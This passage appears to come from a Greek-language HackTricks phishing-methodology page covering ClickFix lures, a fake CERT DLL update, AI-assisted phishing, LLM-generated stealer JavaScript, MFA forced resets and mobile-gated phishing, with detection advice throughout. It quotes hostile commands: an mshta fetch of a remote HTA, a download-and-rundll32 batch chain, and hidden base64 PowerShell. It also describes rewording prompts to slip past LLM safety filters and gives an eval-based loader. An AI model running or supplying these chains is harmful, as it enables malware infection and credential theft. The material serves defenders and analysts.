- Τα browser-side όρια αποθηκεύονται συχνά στο `localStorage`, επομένως το **πρώτο click** μπορεί να οδηγήσει στο malware, ενώ τα refreshes/retries να επιστρέφουν στο καλοπροαίρετο εμφανές link.
- Το TDS μπορεί να εφαρμόζει διαχωρισμό βάσει referrer, domain εισόδου, GEO, browser/device fingerprint, ελέγχων VPN/datacenter, context του click και μετρητών ανά session, καθιστώντας τα replays των analysts μη ντετερμινιστικά.

Ιδέες για Defenders:
- Συγκρίνετε το **εμφανιζόμενο** `href` με τον **πραγματικό** navigation target που δημιουργείται τη στιγμή του click.
- Αναζητήστε handlers `document.addEventListener(..., true)` που καλούν ταυτόχρονα `preventDefault()` και `stopImmediatePropagation()` γύρω από `window.open`, `about:blank` ή synthetic clicks σε anchors.
- Αντιμετωπίστε clusters από domains λήψης software που καταχωρίστηκαν πρόσφατα και φορτώνουν όλα το ίδιο CloudFront/JS stage ως μοτίβο SEO-poisoning/TDS υψηλής ένδειξης.

### ClickFix από fake verification pages + archive-looking LOLBAS fetches
Ορισμένα branches του TDS καταλήγουν σε μια fake verification page (τύπου Cloudflare/IUAM), η οποία υποδεικνύει στο θύμα να εκτελέσει ένα trusted Windows binary, όπως:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Σημειώσεις:
- Το `mshta.exe` εκτελεί το **HTA/VBScript στην αρχή της απόκρισης**, ακόμη και αν το URL προσποιείται ότι αφορά ένα archive `.7z`; τα δεδομένα archive που έχουν προσαρτηθεί μπορούν να είναι καθαρό decoy.
- Τα επόμενα stages συχνά συνεχίζουν να παραποιούν τον τύπο αρχείου (`.rtf` για PowerShell, `.asar` για Python, ZIPs με binaries με padding) και στη συνέχεια μεταβαίνουν σε **manual PE mapping / in-memory execution**.
- Αν ανταποκρίνεστε σε μία από αυτές τις αλυσίδες, διατηρήστε το **network + memory από την πρώτη επιτυχημένη εκτέλεση**: οι μεταγενέστερες επαναλήψεις μπορεί να εμφανίζουν μόνο μια benign διαδρομή installer/SFX ή να αποτυγχάνουν, επειδή η αποδέσμευση του payload/key ήταν συνδεδεμένη με το αρχικό TDS session.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Δόλωμα: cloned advisory εθνικού CERT με κουμπί **Update**, το οποίο εμφανίζει οδηγίες “fix” βήμα προς βήμα. Τα victims καλούνται να εκτελέσουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.<sup>[[12]](#references)</sup>
* Τυπική batch chain που παρατηρήθηκε:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* Το `Invoke-WebRequest` αποθηκεύει το payload στο `%TEMP%`, ένα σύντομο sleep κρύβει το network jitter και στη συνέχεια το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL στέλνει beacon με την ταυτότητα του host και κάνει polling στο C2 κάθε λίγα λεπτά. Το remote tasking φτάνει ως **base64-encoded PowerShell**, το οποίο εκτελείται κρυφά και με policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει tasks χωρίς ενημέρωση του DLL) και αποκρύπτει τα console windows. Αναζητήστε PowerShell children του `rundll32.exe` που χρησιμοποιούν τα `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` μαζί.
* Οι defenders μπορούν να αναζητήσουν HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και polling intervals 5 λεπτών μετά το DLL load.

---

## Phishing Operations ενισχυμένα από AI
Οι attackers πλέον συνδυάζουν **LLM & voice-clone APIs** για πλήρως εξατομικευμένα lures και αλληλεπίδραση σε πραγματικό χρόνο.

| Layer | Παράδειγμα χρήσης από threat actor |
|-------|-------------|
|Automation|Δημιουργία και αποστολή >100 k emails / SMS με τυχαιοποιημένη διατύπωση και tracking links.|
|Generative AI|Παραγωγή *one-off* emails που αναφέρονται σε δημόσιες M&A, σε inside jokes από social media· deep-fake φωνή CEO σε callback scam.|
|Agentic AI|Αυτόματη εγγραφή domains, scraping open-source intel και δημιουργία mails επόμενου stage όταν ένα victim κάνει click αλλά δεν υποβάλλει credentials.|

**Defence:**
• Προσθέστε **dynamic banners** που επισημαίνουν μηνύματα τα οποία αποστέλλονται από untrusted automation (μέσω ανωμαλιών ARC/DKIM).
• Εφαρμόστε **voice-biometric challenge phrases** για τηλεφωνικά αιτήματα υψηλού κινδύνου.
• Προσομοιώνετε συνεχώς AI-generated lures σε awareness programmes – τα static templates είναι πλέον obsolete.

Δείτε επίσης – agentic browsing abuse για credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Δείτε επίσης – AI agent abuse τοπικών CLI tools και MCP (για secrets inventory και detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly phishing JavaScript (in-browser codegen)

Οι attackers μπορούν να διανέμουν HTML που φαίνεται benign και να **παράγουν τον stealer κατά το runtime**, ζητώντας JavaScript από ένα **trusted LLM API** και στη συνέχεια εκτελώντας το μέσα στον browser (π.χ. `eval` ή dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** κωδικοποίηση exfil URLs/Base64 strings στο prompt· επανάληψη της διατύπωσης για παράκαμψη safety filters και μείωση των hallucinations.
2. **Client-side API call:** κατά το load, η JS καλεί ένα public LLM (Gemini/DeepSeek/etc.) ή ένα CDN proxy· μόνο το prompt/API call υπάρχει στο static HTML.
3. **Assemble & exec:** συνένωση της απόκρισης και εκτέλεσή της (polymorphic ανά visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** ο παραγόμενος κώδικας εξατομικεύει το lure (π.χ., parsing token του LogoKit) και δημοσιεύει τα creds στο endpoint που είναι κρυμμένο στο prompt.

**Χαρακτηριστικά αποφυγής εντοπισμού**
- Η κίνηση περνά από γνωστά domains LLM ή αξιόπιστους CDN proxies· μερικές φορές μέσω WebSockets προς ένα backend.
- Δεν υπάρχει static payload· το κακόβουλο JS υπάρχει μόνο μετά το render.
- Οι μη ντετερμινιστικές γεννήσεις παράγουν **μοναδικούς stealers ανά session**.

**Ιδέες ανίχνευσης**
- Εκτέλεση sandboxes με ενεργοποιημένο JS· επισήμανση **runtime `eval`/δυναμικής δημιουργίας script που προέρχεται από απαντήσεις LLM**.
- Αναζήτηση για front-end POSTs προς LLM APIs, τα οποία ακολουθούνται άμεσα από `eval`/`Function` στο επιστρεφόμενο κείμενο.
- Ειδοποίηση για μη εγκεκριμένα LLM domains στην κίνηση client, σε συνδυασμό με επακόλουθα credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Εκτός από το κλασικό push-bombing, οι operators απλώς **επιβάλλουν μια νέα MFA registration** κατά τη διάρκεια της κλήσης στο help desk, ακυρώνοντας το υπάρχον token του χρήστη. Κάθε επόμενο login prompt εμφανίζεται ως νόμιμο στο θύμα.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Παρακολουθήστε για events AzureAD/AWS/Okta όπου τα **`deleteMFA` + `addMFA`** πραγματοποιούνται **μέσα σε λίγα λεπτά από την ίδια IP**.



## Clipboard Hijacking / Pastejacking

Οι επιτιθέμενοι μπορούν να αντιγράψουν κρυφά κακόβουλες εντολές στο clipboard του θύματος από μια παραβιασμένη ή typosquatted web page και στη συνέχεια να εξαπατήσουν τον χρήστη ώστε να τις επικολλήσει μέσα στο **Win + R**, το **Win + X** ή σε ένα παράθυρο terminal, εκτελώντας arbitrary code χωρίς κανένα download ή attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack μέσω QR social engineering
* Μια lure page (π.χ. fake ministry/CERT “channel”) εμφανίζει ένα WhatsApp Web/Desktop QR και instructs το θύμα να το σκανάρει, προσθέτοντας κρυφά τον επιτιθέμενο ως **linked device**.<sup>[[12]](#references)</sup>
* Ο επιτιθέμενος αποκτά αμέσως visibility στα chats/contacts μέχρι να αφαιρεθεί το session. Τα θύματα μπορεί αργότερα να δουν μια ειδοποίηση “new device linked”. Οι defenders μπορούν να αναζητούν unexpected device-link events λίγο μετά από visits σε untrusted QR pages.

### Mobile-gated phishing για την αποφυγή crawlers/sandboxes
Οι operators περιορίζουν ολοένα και περισσότερο τα phishing flows πίσω από έναν απλό device check, ώστε οι desktop crawlers να μην φτάνουν ποτέ στις τελικές σελίδες. Ένα συνηθισμένο pattern είναι ένα μικρό script που ελέγχει αν υπάρχει touch-capable DOM και κάνει post το αποτέλεσμα σε ένα server endpoint. Οι non-mobile clients λαμβάνουν HTTP 500 (ή μια blank page), ενώ στους mobile users παρέχεται το πλήρες flow.<sup>[[7]](#references)</sup>

Minimal client snippet (τυπική λογική):
```html
<script src="/static/detect_device.js"></script>
```
Λογική του `detect_device.js` (απλοποιημένη):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Συχνά παρατηρούμενη συμπεριφορά του server:
- Ορίζει ένα session cookie κατά την πρώτη φόρτωση.
- Δέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) σε επόμενα GET όταν `is_mobile=false`· σερβίρει phishing μόνο όταν είναι `true`.

Heuristics για hunting και detection:
- Ερώτημα urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για non-mobile· τα νόμιμα paths θυμάτων από mobile συσκευές επιστρέφουν 200, με επακόλουθο HTML/JS.
- Κάντε block ή ελέγξτε προσεκτικά σελίδες που καθορίζουν το περιεχόμενο αποκλειστικά με βάση το `ontouchstart` ή παρόμοιους ελέγχους συσκευής.

Συμβουλές άμυνας:
- Εκτελείτε crawlers με mobile-like fingerprints και ενεργοποιημένο JS, ώστε να αποκαλύπτεται το gated content.
- Δημιουργήστε alert για ύποπτες αποκρίσεις 500 που ακολουθούν `POST /detect` σε domains που καταχωρίστηκαν πρόσφατα.

## References

- [1] [Δημιουργία παραλλαγών domain που χρησιμοποιούνται στο phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Εντοπισμός phishing: Εργαλεία και τεχνικές (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Κλοπή credentials και παράκαμψη 2FA με χρήση noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Κλοπή sessions και bypass του 2FA με EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Πώς να εγκαταστήσετε και να ρυθμίσετε το DKIM με Postfix στο Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Παγκόσμια αναφορά του Unit 42 για Incident Response του 2025 – Έκδοση Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated υποδομή phishing και heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Το επόμενο σύνορο των Runtime Assembly Attacks: Αξιοποίηση LLMs για τη δημιουργία Phishing JavaScript σε πραγματικό χρόνο](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking και TDS: Στο εσωτερικό ενός οικοσυστήματος διανομής malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting στο Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Αεροπειρατεία traffic προς το windows.com της Microsoft με bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: Ψεύτικη dating app χρησιμοποιήθηκε ως δόλωμα σε στοχευμένη εκστρατεία spyware στο Πακιστάν](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs και δείγματα του ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
